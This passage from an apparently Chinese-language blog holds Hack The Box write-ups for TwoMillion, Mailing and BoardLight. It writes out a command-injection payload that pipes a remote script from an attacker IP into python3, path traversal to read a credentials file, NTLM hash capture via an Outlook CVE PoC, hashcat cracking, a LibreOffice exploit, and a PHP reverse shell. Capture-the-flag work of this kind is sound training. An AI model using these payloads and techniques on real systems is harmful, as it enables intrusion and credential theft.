j()&#123;$.9(&#123;a:&quot;7&quot;,5:&quot;6&quot;,b:\\&#x27;/d/e/k/l/m\\&#x27;,c:1(0)&#123;3.2(0)&#125;,f:1(0)&#123;3.2(0)&#125;&#125;)&#125;&#x27;</span>,</span><br><span class=\"line\">    <span class=\"number\">24</span>,</span><br><span class=\"line\">    <span class=\"number\">24</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify&#x27;</span>.<span class=\"title function_\">split</span>(<span class=\"string\">&#x27;|&#x27;</span>),</span><br><span class=\"line\">    <span class=\"number\">0</span>,</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  )</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n\n<p>打开 <a href=\"https://lelinhtinh.github.io/de4js/\">de4js</a> 去混淆得到：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">verifyInviteCode</span>(<span class=\"params\">code</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> formData = &#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;code&quot;</span>: code</span><br><span class=\"line\">    &#125;;</span><br><span class=\"line\">    $.<span class=\"title function_\">ajax</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">type</span>: <span class=\"string\">&quot;POST&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">dataType</span>: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">data</span>: formData,</span><br><span class=\"line\">        <span class=\"attr\">url</span>: <span class=\"string\">&#x27;/api/v1/invite/verify&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">response</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">error</span>: <span class=\"keyword\">function</span> (<span class=\"params\">response</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">makeInviteCode</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    $.<span class=\"title function_\">ajax</span>(&#123;</span><br><span class=\"line\">        <span class=\"attr\">type</span>: <span class=\"string\">&quot;POST&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">dataType</span>: <span class=\"string\">&quot;json&quot;</span>,</span><br><span class=\"line\">        <span class=\"attr\">url</span>: <span class=\"string\">&#x27;/api/v1/invite/how/to/generate&#x27;</span>,</span><br><span class=\"line\">        <span class=\"attr\">success</span>: <span class=\"keyword\">function</span> (<span class=\"params\">response</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        <span class=\"attr\">error</span>: <span class=\"keyword\">function</span> (<span class=\"params\">response</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(response)</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>执行</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl http://2million.htb/api/v1/invite/how/to/generate -X POST</span><br></pre></td></tr></table></figure>\n\n<p>得到</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;0&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">200</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;success&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">1</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;data&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;data&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \\/ncv\\/i1\\/vaivgr\\/trarengr&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;enctype&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;ROT13&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;hint&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;Data is encrypted ... We should probbably check the encryption type in order to decrypt it...&quot;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>直接 CyberChef 解 ROT13 得到 In order to generate the invite code, make a POST request to /api/v1/invite/generate。<br>好吧，改个 PATH，再 POST 一下，得到</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;0&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">200</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;success&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">1</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;data&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;code&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;QUtZOEYtMENKMzMtSEE5OVEtS1VHTzQ=&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;format&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;encoded&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>解码得到 <code>PBBOO-D9FOB-9BVZP-KCGHW</code>，不知道为什么 POST 到 <code>/api/v1/invite/verify</code> 的结果是 invalid。不管。</p>\n<p>注册登录后，顺着提示点击 Connection Pack，下载链接为 <code>/api/v1/user/vpn/generate</code>。<br>访问 <code>/api/v1</code>，得到一堆 API。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">v1</span><br><span class=\"line\">  user</span><br><span class=\"line\">    GET</span><br><span class=\"line\">      /api/v1 &quot;Route List&quot;</span><br><span class=\"line\">      /api/v1/invite/how/to/generate &quot;Instructions on invite code generation&quot;</span><br><span class=\"line\">      /api/v1/invite/generate &quot;Generate invite code&quot;</span><br><span class=\"line\">      /api/v1/invite/verify &quot;Verify invite code&quot;</span><br><span class=\"line\">      /api/v1/user/auth &quot;Check if user is authenticated&quot;</span><br><span class=\"line\">      /api/v1/user/vpn/generate &quot;Generate a new VPN configuration&quot;</span><br><span class=\"line\">      /api/v1/user/vpn/regenerate &quot;Regenerate VPN configuration&quot;</span><br><span class=\"line\">      /api/v1/user/vpn/download &quot;Download OVPN file&quot;</span><br><span class=\"line\">    POST </span><br><span class=\"line\">      /api/v1/user/register &quot;Register a new user&quot;</span><br><span class=\"line\">      /api/v1/user/login &quot;Login with existing user&quot;</span><br><span class=\"line\">  admin </span><br><span class=\"line\">    GET </span><br><span class=\"line\">      /api/v1/admin/auth &quot;Check if user is admin&quot;</span><br><span class=\"line\">    POST </span><br><span class=\"line\">      /api/v1/admin/vpn/generate &quot;Generate VPN for specific user&quot;</span><br><span class=\"line\">    PUT </span><br><span class=\"line\">      /api/v1/admin/settings/update &quot;Update user settings&quot;</span><br></pre></td></tr></table></figure>\n\n<p>发现 <code>/api/v1/admin/settings/update</code> 能改管理员身份，传一个</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;email&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;a@a.com&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">  <span class=\"attr\">&quot;is_admin&quot;</span><span class=\"punctuation\">:</span><span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>就能把自己改成 admin。</p>\n<p>对 <code>/api/v1/admin/vpn/generate</code> 进行命令注入：</p>\n<figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\"><span class=\"attr\">&quot;username&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;abc;curl 10.10.14.20:5555/rshell.py | python3;ls&quot;</span></span><br><span class=\"line\"><span class=\"punctuation\">&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>把 shell 弹出来。<br><code>cat .env</code> 看到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DB_HOST=127.0.0.1</span><br><span class=\"line\">DB_DATABASE=htb_prod</span><br><span class=\"line\">DB_USERNAME=admin</span><br><span class=\"line\">DB_PASSWORD=SuperDuperPass123</span><br></pre></td></tr></table></figure>\n\n<p>连一下数据库</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql --user admin --password htb_prod</span><br></pre></td></tr></table></figure>\n\n<p>发现里面没啥有用的，用数据库的密码试一下 ssh，发现密码是相同的。于是登上 admin，然后读 <code>user.txt</code> 拿到第一个 flag。</p>\n<p>然后根据提示找到 <code>/var/mail/admin</code>，里面说 OverlayFS 有 CVE，定位到 CVE-2023-0386。</p>\n<p>用<a href=\"https://github.com/xkaneiki/CVE-2023-0386\">这个 PoC</a> 打一下就行了。<br>后面题目问 GLIBC 版本，执行 <code>ldd --version</code> 即可。</p>\n<p>还留下了一个 CVE-2023-4911，有空再看。</p>\n<h3 id=\"CVE-2023-0386\"><a href=\"#CVE-2023-0386\" class=\"headerlink\" title=\"CVE-2023-0386\"></a>CVE-2023-0386</h3><p>下面来详细分析一下这个 CVE。</p>\n<h4 id=\"FUSE\"><a href=\"#FUSE\" class=\"headerlink\" title=\"FUSE\"></a>FUSE</h4><p>FUSE(Filesystem in Userspace)</p>\n<h2 id=\"Mailing\"><a href=\"#Mailing\" class=\"headerlink\" title=\"Mailing\"></a>Mailing</h2><p>VMWare 的 Kali GUI 崩了，登录完直接黑屏，我之前也忘了存个快照，于是现在就采用纯命令行 + 代理转发的形式用，反正 GUI 里也只图个 Browser 和 Burpsuite。</p>\n<p>还是用的 squid，squid.conf 按下面配置，再重启一下服务就行。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">acl all src all</span><br><span class=\"line\">http_access allow all</span><br><span class=\"line\">hosts_file /etc/hosts</span><br><span class=\"line\">http_port 3128</span><br></pre></td></tr></table></figure>\n\n<p>Burpsuite 里 settings -&gt; Network -&gt; Connection -&gt; Upstream Proxy Servers，设置好代理，然后就能用了。<br>nmap 一扫发现一堆端口，基本都是邮件服务相关，结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PORT      STATE SERVICE</span><br><span class=\"line\">25/tcp    open  smtp</span><br><span class=\"line\">80/tcp    open  http</span><br><span class=\"line\">110/tcp   open  pop3</span><br><span class=\"line\">135/tcp   open  msrpc</span><br><span class=\"line\">139/tcp   open  netbios-ssn</span><br><span class=\"line\">143/tcp   open  imap</span><br><span class=\"line\">445/tcp   open  microsoft-ds</span><br><span class=\"line\">465/tcp   open  smtps</span><br><span class=\"line\">587/tcp   open  submission</span><br><span class=\"line\">993/tcp   open  imaps</span><br><span class=\"line\">5040/tcp  open  unknown</span><br><span class=\"line\">5985/tcp  open  wsman</span><br><span class=\"line\">7680/tcp  open  pando-pub</span><br><span class=\"line\">47001/tcp open  winrm</span><br><span class=\"line\">49664/tcp open  unknown</span><br><span class=\"line\">49665/tcp open  unknown</span><br><span class=\"line\">49666/tcp open  unknown</span><br><span class=\"line\">49667/tcp open  unknown</span><br><span class=\"line\">49668/tcp open  unknown</span><br><span class=\"line\">50304/tcp open  unknown</span><br></pre></td></tr></table></figure>\n\n<p>dirsearch 扫出 <code>/assets/</code> 和 <code>/download.php</code>。<br><code>/assets/</code> 存着一些图片，<code>/download.php</code> 可以任意文件读。<br>由前面扫到的端口可知这是一个 hMailServer，所以可以直接读 <code>hMailServer.INI</code>。<br><code>?file=../../../../../../../../../Program%20Files%20(x86)/hMailServer/Bin/hMailServer.INI</code> 读出如下内容：</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">[Directories]</span></span><br><span class=\"line\"><span class=\"attr\">ProgramFolder</span>=C:\\Program Files (x86)\\hMailServer</span><br><span class=\"line\"><span class=\"attr\">DatabaseFolder</span>=C:\\Program Files (x86)\\hMailServer\\Database</span><br><span class=\"line\"><span class=\"attr\">DataFolder</span>=C:\\Program Files (x86)\\hMailServer\\Data</span><br><span class=\"line\"><span class=\"attr\">LogFolder</span>=C:\\Program Files (x86)\\hMailServer\\Logs</span><br><span class=\"line\"><span class=\"attr\">TempFolder</span>=C:\\Program Files (x86)\\hMailServer\\Temp</span><br><span class=\"line\"><span class=\"attr\">EventFolder</span>=C:\\Program Files (x86)\\hMailServer\\Events</span><br><span class=\"line\"><span class=\"section\">[GUILanguages]</span></span><br><span class=\"line\"><span class=\"attr\">ValidLanguages</span>=english,swedish</span><br><span class=\"line\"><span class=\"section\">[Security]</span></span><br><span class=\"line\"><span class=\"attr\">AdministratorPassword</span>=<span class=\"number\">841</span>bb5acfa6779ae432fd7a4e6600ba7</span><br><span class=\"line\"><span class=\"section\">[Database]</span></span><br><span class=\"line\"><span class=\"attr\">Type</span>=MSSQLCE</span><br><span class=\"line\"><span class=\"attr\">Username</span>=</span><br><span class=\"line\"><span class=\"attr\">Password</span>=<span class=\"number\">0</span>a9f8ad8bf896b501dde74f08efd7e4c</span><br><span class=\"line\"><span class=\"attr\">PasswordEncryption</span>=<span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"attr\">Port</span>=<span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"attr\">Server</span>=</span><br><span class=\"line\"><span class=\"attr\">Database</span>=hMailServer</span><br><span class=\"line\"><span class=\"attr\">Internal</span>=<span class=\"number\">1</span></span><br></pre></td></tr></table></figure>\n\n<p>admin 的密码 hash 为 841bb5acfa6779ae432fd7a4e6600ba7，用 hash-identifier 判断是 MD5，用在线网站解密得到 <code>homenetworkingadministrator</code>。</p>\n<p>md5 在线解密的网站有 <a href=\"https://hashes.com/zh/decrypt/hash\">Hashes</a>，<a href=\"https://crackstation.net/\">crackstation</a> 等。</p>\n<p>用 CVE-2024-21413 打，参考<a href=\"https://www.freebuf.com/vuls/396256.html\">这篇文章</a>，先启动 NTLM 监听</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo impacket-smbserver -smb2support -ip 0.0.0.0 <span class=\"built_in\">test</span> /tmp</span><br></pre></td></tr></table></figure>\n\n<p>再用 <a href=\"https://github.com/xaitax/CVE-2024-21413-Microsoft-Outlook-Remote-Code-Execution-Vulnerability\">PoC</a> 打</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 CVE-2024-21413.py --server mailing.htb --port 587 --username administrator@mailing.htb --password homenetworkingadministrator --sender administrator@mailing.htb --recipient maya@mailing.htb --url <span class=\"string\">&#x27;\\\\10.10.14.20\\test&#x27;</span> --subject Hi</span><br></pre></td></tr></table></figure>\n\n<p>拿到 maya 的 NTLM hash</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">maya::MAILING:aaaaaaaaaaaaaaaa:21bf11591531fc6d3736359f495482b4:0101000000000000804c7084b5b1da013e5cd1bc6af81a5f000000000100100057005a00720067005a00460043005a000300100057005a00720067005a00460043005a00020010004f007100510070005500580055006800040010004f00710051007000550058005500680007000800804c7084b5b1da0106000400020000000800300030000000000000000000000000200000146f2fe8ad5fb58c04447d1f84d31aa0faae084bb712011964e5eb9820bf33200a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320030000000000000000000</span><br></pre></td></tr></table></figure>\n\n<p>放到 <code>1.txt</code>，用 hashcat 爆</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hashcat -a 0 -o passwd.txt 1.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>\n\n<p><code>-a 0</code> 意思是字典模式，<code>-o passwd.txt</code> 是输出文件，<code>1.txt</code> 是输入文件，<code>/usr/share/wordlists/rockyou.txt</code> 是字典文件。<br>爆出来密码是 <code>m4y4ngs4ri</code>。<br>然后用红队神器 evil-winrm 连上，拿到 Windows 的 shell，读 <code>user.txt</code> 拿到第一个 flag。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">evil-winrm -i 10.10.11.14 -u maya -p m4y4ngs4ri</span><br></pre></td></tr></table></figure>\n\n<p>很奇怪这里用 hash 登录不行，会报错 <code>Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError</code>。</p>\n<p>现在就要开始提权了。</p>\n<p>Program Files 里有个 <code>LibreOffice</code>，查看 <code>readme_en-US.txt</code> 可以知道版本是 7.4。<br>搜出是有 CVE-2023-2255 的，用 <a href=\"https://github.com/elweth-sec/CVE-2023-2255\">PoC</a> 打<br>把反弹 shell 的  <code>shell.py</code> 传到 <code>C:\\Users\\maya\\Documents\\</code>，然后本地生成 <code>exploit.odt</code>，再在 Windows 上 curl 下来。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 CVE-2023-2255.py --cmd <span class=\"string\">&quot;python C:\\Users\\maya\\Documents\\shell.py&quot;</span> --output <span class=\"string\">&#x27;exploit.odt&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>在本地挂着 <code>nc -lvnp &lt;port&gt;</code>，一会就有 shell 过来了。</p>\n<p>弹到 localadmin 的 shell 后，可以直接读桌面的 <code>root.txt</code> 拿到 flag，也可以通过以下命令把 maya 提到管理员组：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">net localgroup Administradores maya /add</span><br></pre></td></tr></table></figure>\n\n<p>总的来说，这 Windows 的渗透是真迷糊，一点不会。而且不知道为啥 Evil-WinRM 连上后命令卡得要死</p>\n<h2 id=\"BoardLight\"><a href=\"#BoardLight\" class=\"headerlink\" title=\"BoardLight\"></a>BoardLight</h2><p>扫出来两个端口，一个是 80，一个是 22。<br>一个静态网页，无交互，源码里面有一个 Board.htb，加到 host 里面访问，还是这个页面。<br>开始扫子域名</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wfuzz -c -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class=\"string\">&quot;http://board.htb&quot;</span> -H <span class=\"string\">&quot;Host:FUZZ.board.htb&quot;</span> --hw 1053</span><br></pre></td></tr></table></figure>\n\n<p><code>--hw 1053</code> 是过滤掉 1053 字节的响应。<br>扫到一个 <code>crm.board.htb</code>。<br>加入 <code>/etc/hosts</code> 里，访问到是一个 Dolibarr 的登录页面，随手敲个 admin admin 竟然登上去了，乐。<br>新建一个 website，再在里面新建一个 Page，编辑 HTML 源，写 PHP，保存会报 <code>You add dynamic PHP code that contains the PHP instruction &#39;system&#39; that is forbidden by default as dynamic content (see hidden options WEBSITE_PHP_ALLOW_xxx to increase list of allowed commands). </code></p>\n<p>大写 PHP 绕过，有时也可以直接短标签 <code>&lt;?</code>，或者 <code>&lt;?=system(&#39;ls&#39;)?&gt;</code>，这句等效于 <code>&lt;?php echo system(&#39;ls&#39;)?&gt;</code>。<br>在 <a href=\"https://www.revshells.com/\">Reverse Shell Generator</a> 生成一个 PHP 反弹 shell，然后写进去<br>记得勾上 <code>Show dynamic content</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?</span>PHP</span><br><span class=\"line\"><span class=\"comment\">// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php</span></span><br><span class=\"line\"><span class=\"comment\">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_ invoke__\">set_time_limit</span> (<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"variable\">$VERSION</span> = <span class=\"string\">&quot;1.0&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$ip</span> = <span class=\"string\">&#x27;10.10.14.20&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$port</span> = <span class=\"number\">55555</span>;</span><br><span class=\"line\"><span class=\"variable\">$chunk_size</span> = <span class=\"number\">1400</span>;</span><br><span class=\"line\"><span class=\"variable\">$write_a</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"variable\">$error_a</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"variable\">$shell</span> = <span class=\"string\">&#x27;uname -a; w; id; bash -i&#x27;</span>;</span><br><span class=\"line\"><span class=\"variable\">$daemon</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"><span class=\"variable\">$debug</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">function_exists</span>(<span class=\"string\">&#x27;pcntl_fork&#x27;</span>)) &#123;</span><br><span class=\"line\">  <span class=\"variable\">$pid</span> = <span class=\"title function_ invoke__\">pcntl_fork</span>();</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable\">$pid</span> == -<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">printit</span>(<span class=\"string\">&quot;ERROR: Can&#x27;t fork&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>(<span 